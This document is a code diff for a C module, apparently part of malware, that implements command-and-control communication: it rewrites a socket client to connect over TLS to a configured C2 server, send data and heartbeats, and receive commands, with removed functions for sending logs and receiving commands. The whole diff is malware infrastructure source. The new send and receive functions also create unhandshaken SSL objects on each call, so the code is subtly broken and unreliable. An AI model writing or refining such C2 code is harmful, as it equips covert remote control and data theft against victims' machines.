@@ -1,138 +1,102 @@
 #include "c2_communication_fixed.h"
+#include "config.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
-static int c2_socket = -1;
-static int c2_connected = 0;
+SSL_CTX* ctx = NULL;
+int sockfd = -1;
 
-int c2_init(void) {
-    if (c2_connected) {
-        return 0;
+void init_c2_communication() {
+    // Initialize OpenSSL
+    SSL_library_init();
+    OpenSSL_add_all_algorithms();
+    SSL_load_error_strings();
+    ctx = SSL_CTX_new(SSLv23_client_method());
+    if (!ctx) {
+        perror("SSL_CTX_new failed");
+        exit(EXIT_FAILURE);
     }
 
     // Create socket
-    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (c2_socket < 0) {
-        perror("Failed to create socket");
-        return -1;
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("socket failed");
+        SSL_CTX_free(ctx);
+        exit(EXIT_FAILURE);
     }
 
     // Connect to C2 server
-    if (c2_connect() != 0) {
-        close(c2_socket);
-        c2_socket = -1;
-        return -1;
-    }
-
-    c2_connected = 1;
-    return 0;
-}
-
-void c2_cleanup(void) {
-    if (!c2_connected) {
-        return;
-    }
-
-    // Disconnect from C2 server
-    c2_disconnect();
-
-    // Close socket
-    close(c2_socket);
-    c2_socket = -1;
-    c2_connected = 0;
-}
-
-int c2_send_data(const char *data, size_t size) {
-    if (!c2_connected) {
-        fprintf(stderr, "Not connected to C2 server\n");
-        return -1;
-    }
-
-    // Encrypt data before sending
-    char encrypted_data[size * 2];
-    encrypt_traffic(data, size, encrypted_data);
-
-    // Send data
-    ssize_t bytes_sent = send(c2_socket, encrypted_data, size * 2, 0);
-    if (bytes_sent < 0) {
-        perror("Failed to send data");
-        return -1;
-    }
-
-    return bytes_sent;
-}
-
-int c2_receive_data(char *buffer, size_t buffer_size) {
-    if (!c2_connected) {
-        fprintf(stderr, "Not connected to C2 server\n");
-        return -1;
-    }
-
-    // Receive data
-    ssize_t bytes_received = recv(c2_socket, buffer, buffer_size - 1, 0);
-    if (bytes_received < 0) {
-        perror("Failed to receive data");
-        return -1;
-    }
-
-    // Decrypt data
-    char decrypted_data[buffer_size];
-    decrypt_traffic(buffer, bytes_received, decrypted_data);
-    memcpy(buffer, decrypted_data, bytes_received);
-    buffer[bytes_received] = '\0';
-
-    return bytes_received;
-}
-
-int c2_send_logs(const char *log_data, size_t log_size) {
-    // Implementation would go here
-    return c2_send_data(log_data, log_size);
-}
-
-int c2_receive_command(char *buffer, size_t buffer_size) {
-    // Implementation would go here
-    return c2_receive_data(buffer, buffer_size);
-}
-
-int c2_connect(void) {
-    struct hostent *server = gethostbyname(C2_SERVER);
-    if (server == NULL) {
-        fprintf(stderr, "Failed to resolve C2 server: %s\n", C2_SERVER);
-        return -1;
-    }
-
     struct sockaddr_in server_addr;
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
     server_addr.sin_port = htons(C2_PORT);
-
-    // Connect to server
-    if (connect(c2_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Failed to connect to C2 server");
-        return -1;
+    if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
+        perror("inet_pton failed");
+        close(sockfd);
+        SSL_CTX_free(ctx);
+        exit(EXIT_FAILURE);
     }
 
-    return 0;
-}
-
-void c2_disconnect(void) {
-    if (c2_connected) {
-        shutdown(c2_socket, SHUT_RDWR);
-        c2_connected = 0;
+    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect failed");
+        close(sockfd);
+        SSL_CTX_free(ctx);
+        exit(EXIT_FAILURE);
     }
-}
 
-int c2_is_connected(void) {
-    return c2_connected;
-}
-
-void c2_heartbeat(void) {
-    if (c2_connected) {
-        const char *heartbeat = "HEARTBEAT\n";
-        c2_send_data(heartbeat, strlen(heartbeat));
+    // Create SSL connection
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sockfd);
+    if (SSL_connect(ssl) <= 0) {
+        perror("SSL_connect failed");
+        SSL_free(ssl);
+        close(sockfd);
+        SSL_CTX_free(ctx);
+        exit(EXIT_FAILURE);
     }
+
+    printf("C2 communication initialized\n");
 }
 
-int c2_check_server_status(void) {
-    // Implementation would go here
-    return c2_connected ? 0 : -1;
+void send_data(const char* data, size_t length) {
+    if (sockfd < 0 || !ctx) {
+        init_c2_communication();
+    }
+
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sockfd);
+    SSL_write(ssl, data, length);
+    SSL_free(ssl);
+}
+
+void receive_data(char* buffer, size_t length) {
+    if (sockfd < 0 || !ctx) {
+        init_c2_communication();
+    }
+
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sockfd);
+    SSL_read(ssl, buffer, length);
+    SSL_free(ssl);
+}
+
+void send_heartbeat() {
+    const char* heartbeat = "HEARTBEAT\n";
+    send_data(heartbeat, strlen(heartbeat));
+}
+
+void close_c2_communication() {
+    if (sockfd >= 0) {
+        close(sockfd);
+    }
+    if (ctx) {
+        SSL_CTX_free(ctx);
+    }
 }
